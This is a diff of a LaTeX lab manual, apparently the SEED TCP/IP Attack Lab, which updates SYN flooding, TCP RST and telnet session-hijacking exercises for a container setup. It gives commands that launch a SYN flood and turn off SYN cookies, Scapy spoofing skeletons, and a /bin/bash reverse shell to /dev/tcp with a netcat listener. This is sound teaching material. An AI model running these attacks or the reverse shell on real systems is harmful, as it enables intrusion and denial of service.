@@ -6,8 +6,11 @@
 %%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-\input{../../common-files/header}
-\input{../../common-files/copyright}
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
 
 
 \newcommand{\telnet} {\texttt{telnet}\xspace}
@@ -27,7 +30,7 @@
 {\LARGE TCP/IP Attack Lab}
 \end{center}
 
-\seedlabcopyright{2018}
+\seedlabcopyright{2018 - 2020}
 
 
 
@@ -78,7 +81,7 @@ Detailed coverage of the TCP attacks can be found in the following:
 \end{itemize}
 
 
-\paragraph{Lab environment.} \seedenvironment
+\paragraph{Lab environment.} \seedenvironmentB
 
 
 
@@ -88,61 +91,46 @@ Detailed coverage of the TCP attacks can be found in the following:
 \section{Lab Environment}
 
 
+In this lab, students need to have at least 3 machines. One machine 
+is mainly used for launching attacks, the second machine is used as the victim, and 
+the third one is used as the observer and user. Students can use three virtual 
+machines for this lab, but it will be much more convenient to 
+use one VM plus three containers. We will launch 
+attacks from the VM against one of the containers, while using
+the other two containers as the observer/user machines.
+The lab environment is depicted in the following:
 
-\paragraph{Network Setup.}
-To conduct this lab, students need to have at least 3 machines. One computer
-is used for attacking, the second computer is used as the victim, and 
-the third computer is used as the observer.
-Students can set up 3 virtual machines on the same host computer, or they can set up
-2 virtual machines, and then use the host computer as the third computer.
-For this lab, we put all these three machines on the same LAN,
-the configuration is described in Figure~\ref{tcp:fig:env}.
-
-
-
-\begin{figure}[htb]
-  \begin{center}
-    \includegraphics[width=0.6\textwidth]{\tcpFigs/TCP_Env_setup.pdf}
-  \end{center}
-  \caption{Environment Setup}
-  \label{tcp:fig:env}
-\end{figure}
- 
-
-
-
-\paragraph{{\tt Netwox} Tools.}
-We need tools to send out network packets of different types and with different
-contents. We can use {\tt Netwag} to do that. However, the GUI interface of {\tt Netwag} 
-makes it difficult for us to automate the process. Therefore, we strongly 
-suggest students to use its command-line version, the
-{\tt Netwox} command, which is the underlying command invoked by {\tt Netwag}.  
-
-{\tt Netwox} consists of a suite of tools, each having a specific number. 
-You can run a command like following (the parameters depend on
-which tool you are using). For some of the tool, you have to run it 
-with the root privilege: 
 
 \begin{lstlisting}[backgroundcolor=]
-   $ sudo netwox number [parameters ... ]
+  +------------+      +------------+  +------------+  +------------+
+  |     VM     |      |  Container |  |  Container |  |  Container |
+  | (attacker) |      |  (victim)  |  |   (user1)  |  |   (user2)  |
+  |  10.9.0.1  |      |  10.9.0.5  |  |  10.9.0.6  |  |  10.9.0.7  |
+  +----+-------+      +------+-----+  +------+-----+  +------+-----+
+       | br-<id>             | eth0          | eth0          | eth0
+       |                     |               |               |
+-------+---------------------+---------------+---------------+-------
+           Network  10.9.0.0/24
+
 \end{lstlisting}
+ 
 
+%The configuration is described in Figure~\ref{tcp:fig:env}.
 
-If you are not sure how to set the parameters, you can look at the 
-manual by issuing {\tt "netwox number --help"}.
-You can also learn the parameter settings by running {\tt Netwag}:
-for each command you execute from the graphic interface, {\tt Netwag} 
-actually invokes a corresponding {\tt Netwox} command, and it displays
-the parameter settings. Therefore, you can simply copy and paste 
-the displayed command.
+%\begin{figure}[htb]
+%  \begin{center}
+%    \includegraphics[width=0.6\textwidth]{\tcpFigs/TCP_Env_setup.pdf}
+%  \end{center}
+%  \caption{Environment Setup}
+%  \label{tcp:fig:env}
+%\end{figure}
+ 
 
-
-\paragraph{Scapy Tool.}
-Some of the tasks in this lab can also be conducted using Scapy, which 
-is a powerful interactive packet manipulation program. 
-Scapy is very well maintained and is widely used; while
-\texttt{Netwox} is not being maintained any more. There are many online tutorials on Scapy; we
-expect students to learn how to use Scapy from those tutorials. 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% Input common files related to containers
+\input{\commonfolder/container_setup}
+\input{\commonfolder/container_interface}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 
 
@@ -152,22 +140,6 @@ expect students to learn how to use Scapy from those tutorials.
 % SECTION
 % ******************************************* 
 \section{Lab Tasks}
-
-
-In this lab, students need to conduct attacks on the TCP/IP protocols. 
-They can use the {\tt Netwox} tools and/or other tools in the attacks. 
-All the attacks are performed on \linux operating systems. 
-However, instructors can require students to also conduct 
-the same attacks on other operating systems and compare the 
-observations.
-
-
-
-To simplify the ``guess'' of TCP sequence numbers and source port numbers, 
-we assume that attackers are on the same physical network as the victims. 
-Therefore, you can use sniffer tools to get that information.
-The following is the list of attacks that need to be implemented.
-
 
 
 % -------------------------------------------
@@ -196,60 +168,83 @@ but has not yet gotten a final ACK back. When this queue is full,
 the victim cannot take any more connection. Figure~\ref{tcp:fig:synflooding}
 illustrates the attack.
 
-The size of the queue has a system-wide setting.  In \linux, we can check the
+The size of the queue has a system-wide setting.  In Ubuntu OSes, we can check the
 setting using the following command: 
 
-
-\begin{lstlisting}[backgroundcolor=]
-  $ sudo sysctl -q net.ipv4.tcp_max_syn_backlog
+\begin{lstlisting}
+$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog
+net.ipv4.tcp_max_syn_backlog = 128
 \end{lstlisting}
 
-We can use command {\tt "netstat -na"} to check the usage of the queue, 
+We can use command \texttt{"netstat -nat"} to check the usage of the queue, 
 i.e., the number of half-opened connection associated with a listening port. 
 The state for such connections is \texttt {SYN-RECV}. If the 3-way handshake
 is finished, the state of the connections will be {\tt ESTABLISHED}.
 
 
-In this task, you need to demonstrate the SYN flooding attack. You can 
-use the Netwox tool to conduct the attack, and then use a sniffer 
-tool to capture the attacking packets. While the attack is going on, 
-run the {\tt "netstat -na"} command on the victim machine, and compare 
-the result with that before the attack. 
-Please also describe how you know whether the attack is 
-successful or not. 
+\paragraph{SYN Cookie Countermeasure:}
+By default, Ubuntu's SYN flooding countermeasure is turned on. This 
+mechanism is called SYN cookie. It will kick in if the machine
+detects that it is under the SYN flooding attack.
+We can use the {\tt sysctl} command to turn on/off the SYN 
+cookie mechanism:
 
-The corresponding Netwox tool for this task is numbered 76. Here is a
-simple help screen for this tool. You can also type {\tt "netwox 76 --help"}
-to get the help information.
-
-\begin{lstlisting}[frame=single, backgroundcolor=,
-         caption={The usage of the Netwox Tool 76}, label=tcp:list:netwox76]
-Title:  Synflood    
-    Usage: netwox 76 -i ip -p port [-s spoofip]
-    Parameters:
-    -i|--dst-ip ip              destination IP address 
-    -p|--dst-port port          destination port number 
-    -s|--spoofip spoofip        IP spoof initialzation type 
+\begin{lstlisting}
+$ sudo sysctl -a | grep syncookies     (Display the SYN cookie flag) 
+$ sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
+$ sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
 \end{lstlisting}
 
-\paragraph{SYN Cookie Countermeasure:}
-If your attack seems unsuccessful, one thing that you can investigate is whether 
-the SYN cookie mechanism is turned on. SYN cookie is a defense mechanism to 
-counter the SYN flooding attack.  The mechanism will kick in if the machine
-detects that it is under the SYN flooding attack.
-You can use the {\tt sysctl} command to turn on/off the SYN cookie mechanism:
-\begin{verbatim}
-  $ sudo sysctl -a | grep cookie     (Display the SYN cookie flag) 
-  $ sudo sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
-  $ sudo sysctl -w net.ipv4.tcp_syncookies=1 (turn on  SYN cookie)
-\end{verbatim}
 
-Please run your attacks with the SYN cookie mechanism on and off,
-and compare the results. In your report, please describe why 
-the SYN cookie can effectively protect the machine against the 
-SYN flooding attack. If your instructor does not cover the 
-mechanism in the lecture, you can find out how the SYN cookie 
-mechanism works from the Internet.
+
+\paragraph{Launching the attack.}
+We provide a C program called \texttt{synflood.c}. Students can compile
+the program and then launch the attack on the target machine:
+
+\begin{lstlisting}
+$ gcc -o synflood synflood.c
+$ sudo ./synflood 10.9.0.5 23
+\end{lstlisting}
+ 
+
+While the attack is going on, 
+run the \texttt{"netstat -nat"} command on the victim machine, and compare 
+the result with that before the attack. 
+Please go to another machine, try to telnet to the target machine, 
+and describe your observation.
+
+
+\paragraph{An interesting observation.} On Ubuntu 20.04, if machine X
+has never made a telnet to the victim machine, when the SYN flooding 
+attack is launched, machine X will not be able to telnet into the 
+victim machine. However, if before the attack, machine X
+has already made a telnet to the victim machine, then X 
+seems to be ``immune'' to the SYN flooding attack, and can
+successfully telnet to the victim machine during the attack. 
+It seems that the victim machine remembers past successful 
+connections, and uses this memory when establishing
+future connections with the ``returning'' client. 
+This behavior does not exist in Ubuntu 16.04 
+and earlier versions. 
+
+We have not figured out whether this is a countermeasure specifically designed
+for the SYN flooding attack or this is just a side effect caused by
+the optimization in the TCP implementation. During the attack, 
+to clean the victim machine's memory, 
+we can simply reboot the target machine.
+For containers, rebooting is very simple, we 
+just restart it using the following docker command:
+
+\begin{lstlisting}
+$ docker restart <container id>
+\end{lstlisting}
+ 
+
+
+
+\paragraph{Enable the SYN Cookie Countermeasure.}
+Please enable the SYN cookie mechanism, and 
+run your attacks again, and compare the results. 
 
 
 
@@ -281,25 +276,10 @@ i.e., the attacker can observe the TCP traffic between
 A and B.
 
 
-\paragraph{Using Netwox.} 
-The corresponding Netwox tool for this task is numbered 78. Here is a
-simple help screen for this tool. You can also type {\tt "netwox 78 --help"}
-to get the help information.
-
-\begin{lstlisting}[frame=single, backgroundcolor=,
-         caption={The usage of the Netwox Tool 78}, label=tcp:list:netwox78]
-Title: Reset every TCP packet
-    Usage: netwox 78 [-d device] [-f filter] [-s spoofip]
-    Parameters:
-    -d|--device device             device name {Eth0}
-    -f|--filter filter             pcap filter
-    -s|--spoofip spoofip           IP spoof initialization type {linkbraw}
-\end{lstlisting}
-
-
-\paragraph{Using Scapy.} Please also use Scapy to conduct the TCP RST attack. 
-A skeleton code is provided in the following (you need to replace each
-\texttt{@@@@} with an actual value):  
+\paragraph{Launching the attack manually.} 
+Please use Scapy to conduct the TCP RST attack. 
+A skeleton code is provided in the following. You need to replace each
+\texttt{@@@@} with an actual value (you can get them using Wireshark):  
 
 
 \begin{lstlisting}
@@ -312,10 +292,28 @@ pkt = ip/tcp
 ls(pkt)
 send(pkt,verbose=0)
 \end{lstlisting}
+
+\paragraph{Optional: Launching the attack automatically.} 
+Students are encouraged to write a program to launch the 
+attack automatically using the sniffing-and-spoofing technique. 
+Unlike the manual approach, we get all the parameters
+from sniffed packets, so the entire attack is automated.  
+Please make sure that when you 
+use Scapy's \texttt{sniff} function, don't forget to 
+set the \texttt{iface} argument.  
+
  
 
-
-
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\begin{comment}
+% We comment out  this task, because it does not work any more.
+% It seems that the video streaming client will reconnect to the server
+% if the connection is broken. We haven't figured out a solution yet.
+%
+% My fugure plan:
+%    I would like to use container to host our own streeming service.
+%    Then we can launch the RST attack on the server. 
+%    
 
 % -------------------------------------------
 % SUBSECTION
@@ -355,6 +353,9 @@ at the victim machine (which is the machine run by yourself),
 not at the content server machine (which does not belong to you).
 You only need to use \texttt{Netwox} for this task.  
 
+\end{comment}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
             
 
 % -------------------------------------------
@@ -382,64 +383,16 @@ to execute the malicious commands.
 Figure~\ref{tcp:fig:hijacking} depicts how the attack works.
 In this task, you need to demonstrate how you can hijack a 
 \texttt{telnet} session between two computers. Your goal is to get the
-the \texttt{telnet} server to run a malicious command from you.
+\texttt{telnet} server to run a malicious command from you.
 For the simplicity of the task, we assume that 
 the attacker and the victim are on the same LAN.
 
 
-
-\paragraph{Using Netwox.}
-The corresponding Netwox tool for this task is numbered 40. Here is part of
-the manual for this tool. You can also type {\tt "netwox 40 --help"}
-to get the full help information. You may also need to use Wireshark
-to find out the correct parameters for building the spoofed TCP packet.
-
-\begin{lstlisting}[frame=single, backgroundcolor=,
-     caption={Part usage of netwox tool 40}, label=tcp:list:netwox40]
-Title:  Spoof Ip4Tcp packet   
-    Usage: netwox 40 [parameters ...]
-    Parameters:
-    -l|--ip4-src ip                Source IP      
-    -m|--ip4-dst ip                Destination IP    
-    -j|--ip4-ttl uint32            Time to live 
-    -o|--tcp-src port              TCP Source port number    
-    -p|--tcp-dst port              TCP Destination port number    
-    -q|--tcp-seqnum uint32         TCP sequence number
-    -E|--tcp-window uint32         TCP window size
-    -r|--tcp-acknum uint32         TCP acknowledge number 
-    -z|--tcp-ack|+z|--no-tcp-ack   TCP ack bit
-    -H|--tcp-data data             TCP data
-\end{lstlisting}
-
-
-You can use Wireshark to figure out what value you should put into each field of the 
-spoofed TCP packets. It should be noted in the TCP session hijacking section of the 
-SEED book, the command listed there does not set all the fields of the TCP and IP
-headers. The fields that are not set will use the default value provided
-by \texttt{netwox}. Those default 
-values work for Ubuntu 12.04, but some of them do not work for Ubuntu 16.04. 
-If you use the SEED book as a reference, you need to set those fields accordingly, instead 
-of using the default. All the 
-fields that need to be set are listed in Listing~\ref{tcp:list:netwox40}.
-
-
-In the \texttt{netwox} command above, the \texttt{tcp-data} part only 
-takes hex data. If we want to inject a command string, which is typically represented 
-as a human-readable ASCII string, we need to convert it into  a hex string. 
-There are many ways to do that, but we will just use a very simple command in Python. 
-In the following, we convert an ASCII string \texttt{"Hello World"} to
-a hex string (the quotation marks are not included).
-
-\begin{lstlisting}
-$ python
->>> "Hello World".encode("hex")
-'48656c6c6f20576f726c64'
-\end{lstlisting}
-
-
-\paragraph{Using Scapy.} Please also use Scapy to conduct the TCP Session Hijacking attack.
-A skeleton code is provided in the following (you need to replace each
-\texttt{@@@@} with an actual value):
+\paragraph{Launching the attack manually.}
+Please use Scapy to conduct the TCP Session Hijacking attack.
+A skeleton code is provided in the following. You need to replace each
+\texttt{@@@@} with an actual value; you can use Wireshark to figure out what value you 
+should put into each field of the spoofed TCP packets. 
 
 
 \begin{lstlisting}
@@ -453,6 +406,16 @@ pkt = ip/tcp/data
 ls(pkt)
 send(pkt,verbose=0)
 \end{lstlisting}
+
+
+\paragraph{Optional: Launching the attack automatically.}
+Students are encouraged to write a program to launch the
+attack automatically using the sniffing-and-spoofing technique.
+Unlike the manual approach, we get all the parameters
+from sniffed packets, so the entire attack is automated.
+Please make sure that when you
+use Scapy's \texttt{sniff} function, don't forget to
+set the \texttt{iface} argument.
 
 
 
@@ -485,41 +448,47 @@ command through the session hijacking attack.
 In this task, students need to demonstrate that they can achieve this goal.
 
 
-
-\begin{figure}[htb]
-\centering
-\subfigure[Use \texttt{netcat} to listen to connection]
-{
-  \centering
-  \includegraphics[width=.95\textwidth]{\tcpFigs/reverseshell_attacker.png}
-  \label{tcp:fig:reverse_shell_A}
-}
-\subfigure[Run the reverse shell]
-{
-  \centering
-  \includegraphics[width=.95\textwidth]{\tcpFigs/reverseshell_server.png}
-  \label{tcp:fig:reverse_shell_B}
-}
-\caption{Reverse shell connection to the listening \texttt{netcat} process}
-\label{tcp:fig:reverse_shell}
-\end{figure}
-
-
 To have a \texttt{bash} shell on a remote machine connect back to the attacker's machine, the
 attacker needs a process waiting for some connection on a given port. In this example, we will
 use \texttt{netcat}. This program allows us to specify a port
 number and can listen for a connection on that port.
-In Figure~\ref{tcp:fig:reverse_shell_A}, \texttt{netcat}~(\texttt{nc} for short) is used
-to listen for a connection on port 9090.
-In Figure~\ref{tcp:fig:reverse_shell_B}, the \texttt{/bin/bash} command represents the command that
-would normally be executed on a compromised server. This command has the following pieces:
+In the following demo, we show two windows, each one is from a 
+different machine. The top window is the attack machine \texttt{10.9.0.1},  
+which runs \texttt{netcat}~(\texttt{nc} for short), listening on port \texttt{9090}. 
+The bottom window is the victim machine \texttt{10.9.0.5}, and 
+we type the reverse shell command.
+As soon as the reverse shell gets executed, the top window indicates 
+that we get a shell. This is a reverse shell, i.e., it runs on \texttt{10.9.0.5}.  
+
+
+\begin{lstlisting}[backgroundcolor=]
+           +---------------------------------------------------+ 
+           | (*@\textbf{On 10.9.0.1 (attcker)}@*)                             |
+           |                                                   | 
+           | $ nc -lnv 9090                                    |  
+           | Listening on 0.0.0.0 9090                         |  
+           | Connection received on 10.9.0.5 49382             |  
+           | $   <--+ (*@\textbf{This shell runs on 10.9.0.5}@*)              | 
+           |                                                   |  
+           +---------------------------------------------------+  
+          
+           +---------------------------------------------------+  
+           | (*@\textbf{On 10.9.0.5 (victim)}@*)                              |
+           |                                                   | 
+           |$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1  | 
+           |                                                   | 
+           +---------------------------------------------------+
+\end{lstlisting}
+
+We provide a brief description on the reverse shell command in the following.
+Detailed explanation can be found in the SEED book.
 
 \begin{itemize}
 \item \texttt{"/bin/bash -i"}: \texttt{i} stands for interactive, meaning that the shell must be
   interactive (must provide a shell prompt)
 
-\item \texttt{"> /dev/tcp/10.0.2.4/9090"}: This causes the output (\texttt{stdout}) of the shell
-  to be redirected to the tcp connection to \texttt{10.0.2.4}'s port \texttt{9090}.
+\item \texttt{"> /dev/tcp/10.9.0.1/9090"}: This causes the output (\texttt{stdout}) of the shell
+  to be redirected to the tcp connection to \texttt{10.9.0.1}'s port \texttt{9090}.
   The output \texttt{stdout} is represented by file descriptor number~1.
 
 \item \texttt{"0<\&1"}: File descriptor 0 represents the standard input (\texttt{stdin}). This causes
@@ -529,26 +498,16 @@ would normally be executed on a compromised server. This command has the followi
   causes the error output to be redirected to the tcp connection.
 \end{itemize}
 
-In summary, \texttt{"/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<\&1 2>\&1"} starts a
+In summary, \texttt{"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<\&1 2>\&1"} starts a
 \texttt{bash} shell, with its input coming from a tcp connection, and its standard
 and error outputs being
-redirected to the same tcp connection. In Figure~\ref{tcp:fig:reverse_shell_A}, when the \texttt{bash}
-shell command is executed on \texttt{10.0.2.8}, it connects back to the \texttt{netcat} process
-started on \texttt{10.0.2.4}. This is confirmed via the \texttt{"Connection 10.0.2.8 accepted"}
+redirected to the same tcp connection. 
+
+In the demo shown above, when the \texttt{bash}
+shell command is executed on \texttt{10.9.0.5}, it connects back to the \texttt{netcat} process
+started on \texttt{10.9.0.1}. This is confirmed via the \texttt{"Connection received on 10.9.0.5"}
 message displayed by \texttt{netcat}.
 
-The shell prompt obtained from the connection is now connected to the \texttt{bash} shell. This
-can be observed from the difference in the current working directory (printed via
-\texttt{pwd}). 
-Before the connection was established, the \texttt{pwd} returned
-\texttt{/home/seed}. Once \texttt{netcat} is connected to \texttt{bash},  \texttt{pwd} in the
-new shell returns \texttt{/home/seed/Documents} (directory corresponding to where
-\texttt{/bin/bash} is started from). 
-We can also observe the IP address displayed in the shell prompt
-is also changed to 10.0.2.8, which is the same as that on the server
-machine.
-The output from \texttt{netstat} shows the established
-connection.
 
 The description above shows how you can set up a reverse shell if you have
 the access to the target machine, which is the \texttt{telnet} server in
